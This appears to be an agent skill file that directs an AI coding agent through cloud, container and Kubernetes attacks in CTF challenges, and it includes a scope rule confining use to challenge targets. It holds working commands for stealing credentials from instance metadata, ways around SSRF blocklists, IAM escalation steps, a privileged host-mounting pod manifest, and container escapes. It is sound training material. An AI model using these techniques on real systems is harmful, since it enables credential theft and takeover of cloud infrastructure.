---
name: ctf-cloud
description: Provides cloud, container and Kubernetes attack techniques for CTF challenges. Use when a challenge involves AWS, Azure or GCP credentials, instance metadata (169.254.169.254), S3 or blob storage, IAM policies, ECS task roles, Lambda, a Kubernetes service-account token or kubelet, a Docker socket or container escape, a privileged pod, CI/CD runner secrets, or leaked Terraform and cloud-init configuration. Also use when an SSRF reaches a metadata endpoint or cloud credentials appear in an environment, config file or response. Do not use it for plain web application bugs with no cloud layer, native binary memory corruption, or disk and memory forensics.
license: MIT
compatibility: Requires filesystem-based agent (Claude Code or similar) with bash, Python 3, and internet access for tool installation.
allowed-tools: Bash Read Write Edit Glob Grep Task WebFetch WebSearch Skill
metadata:
  user-invocable: "false"
---

# CTF Cloud, Container & Kubernetes

Cloud challenges are almost always **credential chains**: find one credential, use it to read one more, escalate, then read the flag from the service that holds it. Map the chain before firing tools.

## Scope and safety

Only touch accounts, endpoints and clusters the challenge gives you. Never run enumeration against real cloud accounts, and never leave IAM users, access keys or pods behind on shared infrastructure. Keep artifacts under `ctf-solver/workspaces/<challenge>/`.

## Prerequisites

```bash
pip install awscli boto3          # awscli is already present in the ctf-solver image
# optional, per target:
#   azure-cli, google-cloud-cli, kubectl, kubelet, docker CLI, jq
```

The container ships `aws` and `jq` but **not** `kubectl`, `docker`, `az` or `gcloud` — check with `command -v` before planning a step that needs them, and install only what the challenge actually requires.

## Step 1: What do you actually hold?

| You have | Start here |
|---|---|
| An SSRF, URL fetch, or "preview link" feature | Metadata endpoints below |
| `AWS_*` env vars, `~/.aws/credentials`, or a key in a response | Credential triage |
| A `kubeconfig`, `KUBERNETES_SERVICE_HOST`, or a file at `/var/run/secrets/kubernetes.io/serviceaccount/token` | Kubernetes |
| `/var/run/docker.sock`, `docker` group, `CAP_SYS_ADMIN`, or a privileged container | Container escape |
| A repo with `terraform/`, `cloudformation/`, `.github/workflows/`, `.gitlab-ci.yml` | CI/CD and IaC |
| A Lambda/Function URL or a serverless invoke permission | Serverless |

## Metadata endpoints

```bash
# AWS EC2 (IMDSv1) — role name first, then credentials
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
curl -s http://169.254.169.254/latest/user-data
curl -s http://169.254.169.254/latest/dynamic/instance-identity/document

# AWS EC2 (IMDSv2) — a token is required, so a plain GET returns 401
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# AWS ECS / Fargate task role
curl -s "http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}"

# GCP — the header is mandatory
curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
curl -s -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/project/attributes/

# Azure — the Metadata header is mandatory
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"

# Others: DigitalOcean /metadata/v1/, Alibaba 100.100.100.200, OpenStack 169.254.169.254/openstack
```

SSRF notes that decide these challenges:

- **IMDSv2 needs a PUT**, so an SSRF that only follows GETs will fail against a hardened instance. Look for a redirect or a request-method primitive.
- AWS also answers on `http://[fd00:ec2::254]` over IPv6 — useful when the SSRF blocks the IPv4 literal but allows a bracketed IPv6 host.
- A blocklist for `169.254.169.254` is often bypassable with decimal/octal/hex IPs (`2852039166`, `0251.0376.0251.0376`), a DNS name resolving to it, or a redirect from an allowed host.
- `user-data` frequently contains bootstrap secrets, and `instance-identity/document` gives region and account ID needed for CLI calls.

## Credential triage (AWS)

```bash
aws sts get-caller-identity                      # who am I, which account
export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=... AWS_DEFAULT_REGION=us-east-1

# enumerate what this identity can see
aws iam list-attached-user-policies --user-name <me>
aws iam list-user-policies --user-name <me>
aws iam get-policy-version --policy-arn <arn> --version-id v1
aws s3 ls
aws secretsmanager list-secrets
aws ssm describe-parameters
aws lambda list-functions
aws ec2 describe-instances --query 'Reservations[].Instances[].[InstanceId,Tags]'
```

If the identity is a role, `aws sts assume-role` into anything its trust policy allows — a trust policy with `"Principal": {"AWS": "*"}` and no `ExternalId` condition is the usual intended path.

IAM escalation primitives worth testing in order of reliability:

- `iam:CreatePolicyVersion` with `--set-as-default` on a policy you already attach to yourself
- `iam:AttachUserPolicy` / `PutUserPolicy` (self-attach `AdministratorAccess`)
- `iam:PassRole` + `lambda:CreateFunction` (or `ec2:RunInstances`) → run as a more privileged role
- `lambda:UpdateFunctionCode` on an existing function → execute inside its role, then read `os.environ`
- `iam:CreateAccessKey` on another user, `sts:AssumeRole` on a permissive role

S3 specifics: `aws s3 ls s3://<bucket> --no-sign-request` tests for public read; `aws s3 cp s3://<bucket>/flag.txt -` reads it; a bucket in another region needs `--region`. Bucket policies, ACLs and `list-object-versions` (old versions often keep deleted flags) are all fair game.

## Kubernetes

```bash
# from inside a pod
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
kubectl --server=https://kubernetes.default.svc --token="$TOKEN" \
  --certificate-authority=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  auth can-i --list
kubectl --server=https://kubernetes.default.svc --token="$TOKEN" --insecure-skip-tls-verify get secrets -A
```

Common intended paths:

- **Over-permissive RBAC** — `create pods` or `create deployments` in a namespace lets you schedule a pod with `hostPath: /` and read the node, or mount the flag from a secret.
- **Secret read** — `get secrets` in the target namespace is usually the whole challenge; decode with `base64 -d`.
- **`pods/exec`** — exec into a pod that already has the flag or a more privileged token.
- **Kubelet API** on `:10250` (`/pods`, `/run/<ns>/<pod>/<container>`) — anonymous auth or a stolen kubelet client cert; `:10255` is the read-only port.
- **etcd** on `:2379` with no client cert — `etcdctl get / --prefix --keys-only` dumps every secret.
- **Token projection abuse** — a pod that can create `ServiceAccountToken` requests, or a long-lived token in a leaked manifest.

Escape pod skeleton (only when RBAC allows creating pods):

```yaml
apiVersion: v1
kind: Pod
metadata: {name: pwn, namespace: <ns>}
spec:
  hostPID: true
  hostNetwork: true
  containers:
    - name: c
      image: alpine
      command: ["/bin/sh","-c","sleep 100000"]
      securityContext: {privileged: true}
      volumeMounts: [{name: host, mountPath: /host}]
  volumes: [{name: host, hostPath: {path: /}}]
```

Then `nsenter --target 1 --mount --uts --ipc --net --pid -- sh` or read `/host/flag`.

## Container escape

| Condition | Escape |
|---|---|
| `/var/run/docker.sock` mounted | `docker -H unix:///var/run/docker.sock run -v /:/host --rm -it alpine chroot /host sh` |
| Privileged container | mount the host disk: `mkdir /mnt/h && mount /dev/sda1 /mnt/h`, or `nsenter` via `hostPID` |
| `CAP_SYS_ADMIN` | `mkdir /tmp/c && mount -t cgroup -o rdma cgroup /tmp/c` then the cgroup v1 `release_agent` trick |
| Host PID namespace | `nsenter -t 1 -m -u -i -n -p -- sh`, or read `/proc/1/root/flag` |
| Writable `/proc/sys/kernel/core_pattern` | pipe a core handler to a script you control, then crash a privileged process |
| Only a weak seccomp/AppArmor gap | see [ctf-pwn](../ctf-pwn/SKILL.md) for the binary-level path |

Always check the basics first: `id`, `capsh --print`, `cat /proc/1/cgroup` (tells you whether you are in Docker/K8s), `mount | head`, `ls -l /var/run/docker.sock`, `ls /dev`, and whether `/` is the host filesystem already.

## CI/CD and IaC

- `.github/workflows/*.yml` — `pull_request_target`, `workflow_run`, and unpinned `actions/checkout` in a privileged job are the classic escalation; a token in `${{ secrets.X }}` printed by a modified step leaks it.
- `.gitlab-ci.yml` — `CI_JOB_TOKEN` scope, unprotected branches running on shared runners, `artifacts` containing credentials.
- Jenkins — `/script` Groovy console, `jenkins-cli`, credentials bound to a job you can edit.
- Terraform state (`terraform.tfstate`, `.terraform/`) holds plaintext secrets and ARNs — read it before anything else. `cloud-init`/`user-data` in the repo is the same idea.
- `.git/config` with an embedded token, and `git log -p` on a repo where a secret was committed then removed.

## Serverless

```bash
aws lambda get-function-configuration --function-name <fn> --query 'Environment'
aws lambda invoke --function-name <fn> --payload '{}' out.json && cat out.json
```

`Environment.Variables` usually holds the flag or a database password. Function URLs and API Gateway stages may be invokeable without auth (`--no-sign-request` equivalent: plain `curl`).

## Common flag locations

- EC2/ECS `user-data`, SSM Parameter Store, Secrets Manager values
- S3/GCS/Azure blob objects, including non-current object versions
- Kubernetes Secrets, pod env vars, ConfigMaps, node filesystem via `hostPath`
- Lambda environment variables, CI job logs, Terraform state
- `/flag`, `/root/flag`, `/host/flag` after a container escape

## When to pivot

- The cloud flaw is reached through an SSRF or an app bug → `/ctf-web` for the injection side
- You land in a privileged container and the challenge becomes a kernel or binary exploit → `/ctf-pwn`
- The "cloud" challenge is really a crypto/JWT signing problem with cloud-shaped names → `/ctf-crypto`
- You need the original Kubernetes RBAC and Docker escape write-ups → [../ctf-misc/games-and-vms.md](../ctf-misc/games-and-vms.md#kubernetes-rbac-bypass) and [../ctf-misc/games-and-vms-3.md](../ctf-misc/games-and-vms-3.md#docker-container-escape-techniques)

## Verify

```bash
aws sts get-caller-identity
kubectl version --client
curl -s -o /dev/null -w '%{http_code}\n' http://169.254.169.254/latest/meta-data/
```

Never report a flag read from a decoy path without confirming it matches the challenge's expected format.
